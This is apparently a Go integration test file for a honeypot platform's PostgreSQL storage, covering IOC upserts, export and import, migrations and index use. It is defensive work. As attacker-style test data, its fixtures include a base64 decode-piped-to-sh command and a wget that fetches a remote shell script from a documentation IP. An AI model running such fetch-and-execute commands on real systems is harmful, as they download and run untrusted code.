package database

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/config"
)

// connectPG connects to a PostgreSQL server described by QPOT_TEST_PG_* env
// vars, skipping unless QPOT_TEST_POSTGRES=1. Plain PostgreSQL is enough: the
// events table is created without the TimescaleDB hypertable, and the iocs
// table through the production createIOCTable.
func connectPG(t *testing.T) *TimescaleDB {
	t.Helper()
	if os.Getenv("QPOT_TEST_POSTGRES") != "1" {
		t.Skip("set QPOT_TEST_POSTGRES=1 to run PostgreSQL integration tests")
	}
	port := 5432
	if p := os.Getenv("QPOT_TEST_PG_PORT"); p != "" {
		port, _ = strconv.Atoi(p)
	}
	ts, err := NewTimescaleDB(&config.DatabaseConfig{
		Host:     envOr("QPOT_TEST_PG_HOST", "127.0.0.1"),
		Port:     port,
		Username: envOr("QPOT_TEST_PG_USER", "postgres"),
		Password: envOr("QPOT_TEST_PG_PASS", "postgres"),
		Database: envOr("QPOT_TEST_PG_DB", "qpot_test"),
		SSLMode:  "disable",
	})
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	if err := ts.Connect(ctx); err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(func() { ts.Close() })
	for _, q := range []string{
		`DROP TABLE IF EXISTS events, iocs CASCADE`,
		`CREATE TABLE events (
			id BIGSERIAL, timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(), honeypot TEXT NOT NULL,
			source_ip INET, source_port INTEGER, dest_port INTEGER, protocol TEXT, event_type TEXT,
			username TEXT, password TEXT, command TEXT, payload BYTEA, metadata JSONB,
			country TEXT, city TEXT, asn TEXT,
			technique_id TEXT DEFAULT '', technique_name TEXT DEFAULT '', tactic_id TEXT DEFAULT '',
			tactic_name TEXT DEFAULT '', kill_chain_stage TEXT DEFAULT '',
			confidence DOUBLE PRECISION DEFAULT 0, classified BOOLEAN DEFAULT FALSE)`,
		// The pre-fix iocs schema, so createIOCTable's in-place upgrade is exercised.
		`CREATE TABLE iocs (id TEXT NOT NULL, type TEXT NOT NULL, value TEXT NOT NULL,
			honeypot TEXT NOT NULL, source_ip TEXT, technique_id TEXT DEFAULT '',
			first_seen TIMESTAMPTZ NOT NULL DEFAULT NOW(), last_seen TIMESTAMPTZ NOT NULL DEFAULT NOW(),
			count BIGINT DEFAULT 1, metadata JSONB, UNIQUE (type, value, honeypot))`,
	} {
		if _, err := ts.pool.Exec(ctx, q); err != nil {
			t.Fatalf("setup: %v", err)
		}
	}
	if err := ts.createIOCTable(ctx); err != nil {
		t.Fatalf("createIOCTable: %v", err)
	}
	// The events table above is the schema before categories; the
	// production upgrade adds the column.
	if err := ts.ensureEventColumns(ctx); err != nil {
		t.Fatalf("ensureEventColumns: %v", err)
	}
	return ts
}

// INET columns must come back as plain addresses ("1.2.3.4", not
// "1.2.3.4/32"), and filtering by a plain address must match.
func TestPGSourceIPIsPlainAddress(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	ev := &Event{Timestamp: time.Now().UTC(), Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "login_failed"}
	if err := ts.InsertEvent(ctx, ev); err != nil {
		t.Fatal(err)
	}
	got, err := ts.GetEvents(ctx, EventFilter{SourceIPs: []string{"203.0.113.5"}, Limit: 10})
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetEvents by IP = %d rows (%v), want 1 row with plain IP", len(got), got)
	}
	un, err := ts.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(un) != 1 || un[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetUnclassifiedEvents = %v, %v", un, err)
	}
	top, err := ts.GetTopAttackers(ctx, 10, time.Now().Add(-time.Hour))
	if err != nil || len(top) != 1 || top[0].SourceIP != "203.0.113.5" {
		t.Fatalf("GetTopAttackers = %v, %v", top, err)
	}
}

// A long attacker-controlled IOC value must not fail (and roll back) the batch.
func TestPGLongIOCValue(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	raw := make([]byte, 6000)
	if _, err := rand.Read(raw); err != nil {
		t.Fatal(err)
	}
	long := "echo " + base64.StdEncoding.EncodeToString(raw) + " | base64 -d | sh"
	now := time.Now().UTC()
	iocs := []*IOC{
		{ID: "a", Type: "command", Value: long, Honeypot: "cowrie", FirstSeen: now, LastSeen: now, Count: 1},
		{ID: "b", Type: "ip", Value: "198.51.100.1", Honeypot: "cowrie", FirstSeen: now, LastSeen: now, Count: 1},
	}
	if err := ts.InsertIOCs(ctx, iocs); err != nil {
		t.Fatalf("InsertIOCs: %v", err)
	}
	// Re-inserting the same long value must upsert, not duplicate.
	if err := ts.InsertIOCs(ctx, iocs[:1]); err != nil {
		t.Fatalf("InsertIOCs again: %v", err)
	}
	var rows, count int64
	if err := ts.pool.QueryRow(ctx, `SELECT count(*), COALESCE(SUM(count) FILTER (WHERE type='command'),0) FROM iocs`).Scan(&rows, &count); err != nil {
		t.Fatal(err)
	}
	if rows != 2 || count != 2 {
		t.Fatalf("rows=%d command count=%d, want 2 rows and count 2", rows, count)
	}
}

// Re-sighting an IOC without a technique must keep the stored technique.
func TestPGIOCKeepsTechnique(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	ioc := &IOC{ID: "u", Type: "url", Value: "http://198.51.100.2/x.sh", Honeypot: "cowrie",
		TechniqueID: "T1105", FirstSeen: now, LastSeen: now, Count: 1}
	if err := ts.InsertIOC(ctx, ioc); err != nil {
		t.Fatal(err)
	}
	again := *ioc
	again.TechniqueID = ""
	if err := ts.InsertIOCs(ctx, []*IOC{&again}); err != nil {
		t.Fatal(err)
	}
	var tech string
	if err := ts.pool.QueryRow(ctx, `SELECT technique_id FROM iocs WHERE value=$1`, ioc.Value).Scan(&tech); err != nil {
		t.Fatal(err)
	}
	if tech != "T1105" {
		t.Fatalf("technique_id = %q after re-sighting, want T1105", tech)
	}
}

// Export then import must restore every row, including commands with newlines.
func TestPGExportImportMultilineCommand(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC().Truncate(time.Second)
	for i, cmd := range []string{"echo a\nwget http://198.51.100.3/x.sh", "uname -a"} {
		ev := &Event{Timestamp: now.Add(time.Duration(i) * time.Second), Honeypot: "cowrie",
			SourceIP: "203.0.113.6", EventType: "command", Command: cmd}
		if err := ts.InsertEvent(ctx, ev); err != nil {
			t.Fatal(err)
		}
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, now.Add(-time.Minute), now.Add(time.Minute), &buf); err != nil {
		t.Fatal(err)
	}
	if _, err := ts.pool.Exec(ctx, `TRUNCATE events`); err != nil {
		t.Fatal(err)
	}
	if err := ts.ImportData(ctx, &buf); err != nil {
		t.Fatal(err)
	}
	var n int
	var cmd string
	if err := ts.pool.QueryRow(ctx, `SELECT count(*), COALESCE(MAX(command) FILTER (WHERE command LIKE 'echo%'),'') FROM events`).Scan(&n, &cmd); err != nil {
		t.Fatal(err)
	}
	if n != 2 || cmd != "echo a\nwget http://198.51.100.3/x.sh" {
		t.Fatalf("imported %d rows, multiline command %q; want 2 rows and the original command", n, cmd)
	}
}

// Migrate must work on a fresh database (no schema_migrations table yet), and
// rolling back must actually lower the reported version.
func TestPGMigrateUpAndDown(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, `DROP TABLE IF EXISTS schema_migrations`); err != nil {
		t.Fatal(err)
	}
	mm := NewMigrationManager(ts)
	for _, mig := range GetCoreMigrations() {
		mm.Register(mig)
	}
	if err := mm.Migrate(ctx); err != nil {
		t.Fatalf("Migrate: %v", err)
	}
	for _, step := range []int{2, 0, 3} {
		if err := mm.MigrateToVersion(ctx, step); err != nil {
			t.Fatalf("MigrateToVersion(%d): %v", step, err)
		}
		if v, _ := mm.GetCurrentVersion(ctx); v != step {
			t.Fatalf("after MigrateToVersion(%d) version = %d", step, v)
		}
	}
}

// One malformed attacker-supplied event must not roll back the whole batch.
func TestPGInsertEventsSurvivesBadValues(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	events := []*Event{
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "login_failed"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "", EventType: "session"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.6", Username: "root\x00", EventType: "login_failed"},
		{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.7", Command: "echo \xff\xfe",
			Metadata: map[string]string{"k\x00": "v\xff"}, EventType: "command"},
	}
	if err := ts.InsertEvents(ctx, events); err != nil {
		t.Fatalf("InsertEvents: %v", err)
	}
	var n int
	if err := ts.pool.QueryRow(ctx, `SELECT count(*) FROM events`).Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != len(events) {
		t.Fatalf("persisted %d of %d events", n, len(events))
	}
}

// A row whose metadata is not the flat map of strings the collector stores
// must not fail the reads that reach it. On a live instance one such row made
// the dashboard's event lists answer "internal error", and the worker's batch
// query fails the same way, at the same row, on every pass.
func TestPGReadsSurviveOddMetadata(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC().Truncate(time.Millisecond)
	for i, metadata := range []any{
		`{"session": "s1"}`, `{"a": {"b": 1}, "n": 5, "s": "x", "z": null}`, `[1, 2]`, `"text"`, `7`, nil,
	} {
		if _, err := ts.pool.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type, metadata)
			VALUES ($1, 'cowrie', '203.0.113.9', 'cowrie.session.connect', $2::jsonb)`,
			now.Add(time.Duration(i)*time.Second), metadata); err != nil {
			t.Fatalf("insert metadata %v: %v", metadata, err)
		}
	}
	check := func(what string, events []*Event, err error) {
		t.Helper()
		if err != nil || len(events) != 6 {
			t.Fatalf("%s = %d events, %v; want all 6", what, len(events), err)
		}
		byTime := map[time.Time]map[string]string{}
		for _, e := range events {
			byTime[e.Timestamp.UTC()] = e.Metadata
		}
		if m := byTime[now]; len(m) != 1 || m["session"] != "s1" {
			t.Errorf("%s: the collector's own shape read as %v", what, m)
		}
		if m := byTime[now.Add(time.Second)]; len(m) != 4 || m["a"] != `{"b": 1}` || m["n"] != "5" || m["s"] != "x" || m["z"] != "" {
			t.Errorf("%s: mixed values read as %v", what, m)
		}
		for i := 2; i < 6; i++ {
			if m := byTime[now.Add(time.Duration(i)*time.Second)]; m != nil {
				t.Errorf("%s: metadata that is no object read as %v", what, m)
			}
		}
	}
	events, err := ts.GetEvents(ctx, EventFilter{Limit: 10})
	check("GetEvents", events, err)
	events, err = ts.GetUnclassifiedEvents(ctx, 10)
	check("GetUnclassifiedEvents", events, err)
	for _, e := range events {
		if one, err := ts.GetEventByID(ctx, e.ID); err != nil || one == nil {
			t.Errorf("GetEventByID(%s) = %v, %v", e.ID, one, err)
		}
	}
}

// The worker's batch query must be answered from the index on unclassified
// rows. Without it the database sorted the whole table for every batch: 1.4
// to 3.4 seconds with 5 million events stored, on the one CPU it gets.
func TestPGWorkerBatchUsesTheUnclassifiedIndex(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, eventsUnclassifiedIndexSQL); err != nil {
		t.Fatalf("create the index: %v", err)
	}
	if _, err := ts.pool.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type, classified)
		SELECT now() - (g || ' seconds')::interval, 'cowrie', '203.0.113.9', 'cowrie.session.connect', g > 25
		FROM generate_series(1, 20000) g`); err != nil {
		t.Fatal(err)
	}
	if _, err := ts.pool.Exec(ctx, "ANALYZE events"); err != nil {
		t.Fatal(err)
	}
	rows, err := ts.pool.Query(ctx, "EXPLAIN "+pgUnclassifiedEventsSQL+" LIMIT 500")
	if err != nil {
		t.Fatal(err)
	}
	var plan strings.Builder
	for rows.Next() {
		var line string
		if err := rows.Scan(&line); err != nil {
			t.Fatal(err)
		}
		plan.WriteString(line + "\n")
	}
	if err := rows.Err(); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(plan.String(), "idx_events_unclassified") || strings.Contains(plan.String(), "Seq Scan") {
		t.Fatalf("the batch query does not use the index on unclassified rows:\n%s", plan.String())
	}
	events, err := ts.GetUnclassifiedEvents(ctx, 500)
	if err != nil || len(events) != 25 {
		t.Fatalf("GetUnclassifiedEvents = %d events, %v; want the 25 unclassified", len(events), err)
	}
	for i := 1; i < len(events); i++ {
		if events[i].Timestamp.Before(events[i-1].Timestamp) {
			t.Fatalf("the batch is not oldest first at %d", i)
		}
	}
	// Classified, a row leaves the index and the next batch.
	events[0].Classified, events[0].TechniqueID = true, "T1110"
	if err := ts.TagEvent(ctx, events[0]); err != nil {
		t.Fatal(err)
	}
	if left, err := ts.GetUnclassifiedEvents(ctx, 500); err != nil || len(left) != 24 {
		t.Fatalf("after one was classified: %d events, %v; want 24", len(left), err)
	}
}

// The removal of second copies finds its rows by the batch's span of time. A
// time that lost its microseconds on the way (a batch recovered from a
// checkpoint, a caller that rounds) must still be inside the span, and rows
// of the same observation far outside it must still count as the first copy.
func TestPGRemoveReplayedEventsBoundsByTheBatchTimes(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, eventsObservationIndexSQL); err != nil {
		t.Fatal(err)
	}
	old := time.Now().UTC().Add(-40 * 24 * time.Hour).Truncate(time.Microsecond)
	now := time.Now().UTC().Truncate(time.Millisecond).Add(789 * time.Microsecond)
	const first, second = "0a0a0a0a-0000-8000-8000-000000000001", "0a0a0a0a-0000-8000-8000-000000000002"
	for _, row := range []struct {
		at         time.Time
		id         string
		classified bool
	}{
		{old, first, true}, // stored and classified 40 days ago
		{now, second, false},
		{now.Add(2 * time.Second), "0a0a0a0a-0000-8000-8000-000000000003", false},
		{now.Add(3 * time.Second), second, false}, // a second copy
		// The batch's last row, also a second copy: rounded down, its time
		// lies before the row's own.
		{now.Add(4 * time.Second), first, false},
	} {
		if _, err := ts.pool.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type, classified, event_id)
			VALUES ($1, 'cowrie', '203.0.113.9', 'cowrie.session.connect', $2, $3)`, row.at, row.classified, row.id); err != nil {
			t.Fatal(err)
		}
	}
	batch, err := ts.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(batch) != 4 {
		t.Fatalf("GetUnclassifiedEvents = %d events, %v", len(batch), err)
	}
	for _, e := range batch {
		e.Timestamp = e.Timestamp.Truncate(time.Millisecond)
	}
	kept, removed, err := ts.RemoveReplayedEvents(ctx, append([]*Event{nil, {ID: "not-a-row"}}, batch...))
	if err != nil || removed != 2 {
		t.Fatalf("removed %d rows, %v; want the two second copies", removed, err)
	}
	if len(kept) != 3 || kept[0].ID != "not-a-row" {
		t.Fatalf("kept %d events of the batch, want the foreign one and two rows: %+v", len(kept), kept)
	}
	var total, distinct int
	if err := ts.pool.QueryRow(ctx, "SELECT count(*), count(DISTINCT event_id) FROM events").Scan(&total, &distinct); err != nil || total != 3 || distinct != 3 {
		t.Fatalf("%d rows of %d observations left, %v; want 3 of 3", total, distinct, err)
	}
	var stillOld bool
	if err := ts.pool.QueryRow(ctx, "SELECT bool_or(timestamp = $1 AND classified) FROM events WHERE event_id = $2", old, first).Scan(&stillOld); err != nil || !stillOld {
		t.Fatalf("the classified first copy from 40 days ago is gone (%v, %v)", stillOld, err)
	}
}

func TestPGIOCFilters(t *testing.T) {
	checkIOCValueAndSourceFilters(t, connectPG(t), nil)
}

// TestPGCollectorIngestView replays the statement Vector's postgres sink
// issues (jsonb_populate_recordset over the target's row type) against the
// events_ingest view with collector-shaped rows: fields the view lacks must
// take the table defaults (id, classified=false), unknown keys are ignored,
// and a hex-encoded payload with a backslash round-trips.
func TestPGCollectorIngestView(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	if _, err := ts.pool.Exec(ctx, eventsIngestViewSQL); err != nil {
		t.Fatal(err)
	}
	rows := `[{"timestamp":"2026-11-02 05:28:03.341+00","honeypot":"cowrie","source_ip":"203.0.113.9",
		"source_port":55632,"dest_port":22,"protocol":"ssh","event_type":"cowrie.command.input",
		"username":"","password":"","command":"uname -a","payload":"\\x615c7a62",
		"metadata":{"session":"s1"},"qpot_id":"qp_x","message":"raw","file":"/data/x"}]`
	if _, err := ts.pool.Exec(ctx,
		`INSERT INTO events_ingest SELECT * FROM jsonb_populate_recordset(NULL::events_ingest, $1)`, rows); err != nil {
		t.Fatalf("sink-style insert: %v", err)
	}
	got, err := ts.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(got) != 1 {
		t.Fatalf("GetUnclassifiedEvents = %v, %v", got, err)
	}
	ev := got[0]
	if ev.Command != "uname -a" || string(ev.Payload) != `a\zb` ||
		ev.Metadata["session"] != "s1" || ev.Classified {
		t.Fatalf("ingested event = %+v", ev)
	}
	// No GeoIP: country/city/asn are NULL. Every read path must cope.
	if top, err := ts.GetTopAttackers(ctx, 10, time.Time{}); err != nil || len(top) != 1 || top[0].SourceIP != "203.0.113.9" {
		t.Fatalf("GetTopAttackers = %v, %v", top, err)
	}
	if evs, err := ts.GetEvents(ctx, EventFilter{Limit: 10}); err != nil || len(evs) != 1 {
		t.Fatalf("GetEvents = %v, %v", evs, err)
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, time.Time{}, time.Now().Add(time.Hour), &buf); err != nil {
		t.Fatalf("ExportData: %v", err)
	}
	if _, err := ts.GetStats(ctx, time.Time{}); err != nil {
		t.Fatalf("GetStats: %v", err)
	}
}

func TestPGTagsSameTimestampEventsSeparately(t *testing.T) {
	ts := connectPG(t)
	checkSameMillisecondTagging(t, ts, "198.51.100.77", func() {})
}

// GetStats must report per-honeypot counts: alert honeypot filters, the alert's
// top honeypot and the overview all depend on them.
func TestPGStatsTopHoneypots(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	now := time.Now().UTC()
	var evs []*Event
	for i := 0; i < 3; i++ {
		evs = append(evs, &Event{Timestamp: now, Honeypot: "cowrie", SourceIP: "203.0.113.5", EventType: "x"})
	}
	evs = append(evs, &Event{Timestamp: now, Honeypot: "dionaea", SourceIP: "203.0.113.6", EventType: "x"})
	if err := ts.InsertEvents(ctx, evs); err != nil {
		t.Fatal(err)
	}
	st, err := ts.GetStats(ctx, now.Add(-time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	if len(st.TopHoneypots) != 2 || st.TopHoneypots[0].Honeypot != "cowrie" || st.TopHoneypots[0].Count != 3 ||
		st.TopHoneypots[1].Count != 1 {
		t.Fatalf("TopHoneypots = %+v", st.TopHoneypots)
	}
}

func TestPGIOCSightingsAccumulate(t *testing.T) {
	checkIOCSightingsAccumulate(t, connectPG(t), "198.51.100.90", func() {})
}

// An export must import back in full: events without a source IP (exported as
// "") used to fail the ::inet cast and be dropped with only a log line, and
// timestamps lost their sub-second part.
func TestPGExportImportKeepsNullIPAndPrecision(t *testing.T) {
	ts := connectPG(t)
	ctx := context.Background()
	at := time.Now().UTC().Truncate(time.Millisecond).Add(-time.Minute).Add(123 * time.Millisecond)
	if _, err := ts.pool.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type, username, password, command,
		protocol, country, city, asn) VALUES ($1, 'cowrie', NULL, 'x', '', '', '', '', '', '', '')`, at); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := ts.ExportData(ctx, at.Add(-time.Minute), at.Add(time.Minute), &buf); err != nil {
		t.Fatal(err)
	}
	if _, err := ts.pool.Exec(ctx, `DELETE FROM events`); err != nil {
		t.Fatal(err)
	}
	if err := ts.ImportData(ctx, &buf); err != nil {
		t.Fatalf("ImportData: %v", err)
	}
	var n int
	var got time.Time
	if err := ts.pool.QueryRow(ctx, `SELECT COUNT(*), MAX(timestamp) FROM events WHERE source_ip IS NULL`).Scan(&n, &got); err != nil {
		t.Fatal(err)
	}
	if n != 1 || !got.Equal(at) {
		t.Fatalf("imported %d NULL-IP rows at %v, want 1 at %v", n, got, at)
	}

	if err := ts.ImportData(ctx, strings.NewReader("header\nnot,a,valid,row\n")); err == nil {
		t.Error("ImportData reported success for a malformed row")
	}
}
